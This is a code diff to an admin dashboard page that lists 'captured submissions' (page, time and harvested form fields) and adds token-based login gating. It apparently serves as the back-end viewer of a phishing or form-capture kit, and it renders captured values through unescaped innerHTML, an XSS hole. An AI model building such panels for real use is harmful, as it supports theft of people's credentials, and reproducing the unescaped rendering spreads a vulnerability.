@@ -6,60 +6,123 @@
   <title>Admin — Captured Data</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #111; color: #e4e6eb; padding: 24px; }
-    h1 { margin-bottom: 16px; font-size: 22px; }
-    .controls { margin-bottom: 16px; display: flex; gap: 10px; }
-    .controls button { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0a0f; color: #e4e6eb; padding: 24px; }
+    .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+    h1 { font-size: 22px; }
+    .top-actions { display: flex; gap: 10px; }
+    .top-actions button { padding: 8px 16px; border: none; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; transition: opacity .15s; }
+    .top-actions button:hover { opacity: .85; }
     #refreshBtn { background: #0b57d0; color: #fff; }
     #clearBtn { background: #d32f2f; color: #fff; }
+    #logoutBtn { background: rgba(255,255,255,.08); color: #fff; border: 1px solid rgba(255,255,255,.15); }
     table { width: 100%; border-collapse: collapse; }
-    th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid #333; font-size: 14px; }
-    th { background: #1a1a1a; color: #aaa; text-transform: uppercase; font-size: 12px; letter-spacing: 0.5px; }
-    tr:hover { background: #1a1a2e; }
-    .empty { color: #666; padding: 40px; text-align: center; }
+    th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,.08); font-size: 14px; }
+    th { background: rgba(255,255,255,.04); color: #888; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
+    tr:hover { background: rgba(255,255,255,.03); }
+    .empty { color: #555; padding: 60px; text-align: center; font-size: 15px; }
     .field-key { color: #888; }
     .field-val { color: #4fc3f7; }
+    .loading { text-align: center; padding: 60px; color: #555; }
+    .auth-gate { display: flex; align-items: center; justify-content: center; min-height: 80vh; color: #555; font-size: 15px; }
   </style>
 </head>
 <body>
-  <h1>📋 Captured Submissions</h1>
-  <div class="controls">
-    <button id="refreshBtn" onclick="load()">Refresh</button>
-    <button id="clearBtn" onclick="clearAll()">Clear All</button>
+  <div id="authGate" class="auth-gate">Verifying access…</div>
+
+  <div id="dashboard" style="display:none;">
+    <div class="top-bar">
+      <h1>📋 Captured Submissions</h1>
+      <div class="top-actions">
+        <button id="refreshBtn" onclick="load()">↻ Refresh</button>
+        <button id="clearBtn" onclick="clearAll()">🗑 Clear All</button>
+        <button id="logoutBtn" onclick="logout()">↪ Logout</button>
+      </div>
+    </div>
+    <div id="content"><div class="loading">Loading…</div></div>
   </div>
-  <div id="content"></div>
 
   <script>
-    async function load() {
-      const res = await fetch('/api/data');
-      const data = await res.json();
-      const el = document.getElementById('content');
+    const TOKEN_KEY = 'adminToken';
 
-      if (!data.length) {
-        el.innerHTML = '<p class="empty">No submissions yet.</p>';
-        return;
-      }
-
-      let html = '<table><thead><tr><th>#</th><th>Time</th><th>Page</th><th>Captured Fields</th></tr></thead><tbody>';
-      data.forEach((entry, i) => {
-        const fields = entry.fields || {};
-        const fieldStr = Object.entries(fields)
-          .map(([k, v]) => `<span class="field-key">${k}:</span> <span class="field-val">${v}</span>`)
-          .join(' &nbsp;|&nbsp; ');
-        const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '—';
-        html += `<tr><td>${i + 1}</td><td>${time}</td><td>${entry.page || '—'}</td><td>${fieldStr || '—'}</td></tr>`;
-      });
-      html += '</tbody></table>';
-      el.innerHTML = html;
+    function getToken() {
+      return sessionStorage.getItem(TOKEN_KEY);
     }
 
-    async function clearAll() {
-      if (!confirm('Clear all captured data?')) return;
-      await fetch('/api/clear');
+    function authHeaders() {
+      return { 'Authorization': 'Bearer ' + getToken() };
+    }
+
+    // ── Verify token on page load ──────────────────────
+    async function verifyAccess() {
+      const token = getToken();
+      if (!token) return redirectToLogin();
+
+      try {
+        const res = await fetch('/api/admin/verify', { headers: authHeaders() });
+        if (!res.ok) return redirectToLogin();
+        const data = await res.json();
+        if (!data.valid) return redirectToLogin();
+      } catch (e) {
+        return redirectToLogin();
+      }
+
+      // Authenticated — show dashboard
+      document.getElementById('authGate').style.display = 'none';
+      document.getElementById('dashboard').style.display = 'block';
       load();
     }
 
-    load();
+    function redirectToLogin() {
+      sessionStorage.removeItem(TOKEN_KEY);
+      window.location.href = '/admin/login';
+    }
+
+    // ── Load data ──────────────────────────────────────
+    async function load() {
+      try {
+        const res = await fetch('/api/data', { headers: authHeaders() });
+        if (res.status === 401) return redirectToLogin();
+        const data = await res.json();
+        const el = document.getElementById('content');
+
+        if (!data.length) {
+          el.innerHTML = '<p class="empty">No submissions yet.</p>';
+          return;
+        }
+
+        let html = '<table><thead><tr><th>#</th><th>Time</th><th>Page</th><th>Captured Fields</th></tr></thead><tbody>';
+        data.forEach((entry, i) => {
+          const fields = entry.fields || {};
+          const fieldStr = Object.entries(fields)
+            .map(([k, v]) => `<span class="field-key">${k}:</span> <span class="field-val">${v}</span>`)
+            .join(' &nbsp;|&nbsp; ');
+          const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '—';
+          html += `<tr><td>${i + 1}</td><td>${time}</td><td>${entry.page || '—'}</td><td>${fieldStr || '—'}</td></tr>`;
+        });
+        html += '</tbody></table>';
+        el.innerHTML = html;
+      } catch (e) {
+        document.getElementById('content').innerHTML = '<p class="empty">Failed to load data.</p>';
+      }
+    }
+
+    // ── Clear all data ─────────────────────────────────
+    async function clearAll() {
+      if (!confirm('Clear all captured data?')) return;
+      const res = await fetch('/api/clear', { headers: authHeaders() });
+      if (res.status === 401) return redirectToLogin();
+      load();
+    }
+
+    // ── Logout ─────────────────────────────────────────
+    async function logout() {
+      try { await fetch('/api/admin/logout', { method: 'POST', headers: authHeaders() }); } catch (e) {}
+      sessionStorage.removeItem(TOKEN_KEY);
+      window.location.href = '/admin/login';
+    }
+
+    // Kick off auth check
+    verifyAccess();
   </script>
 </body>
 </html>
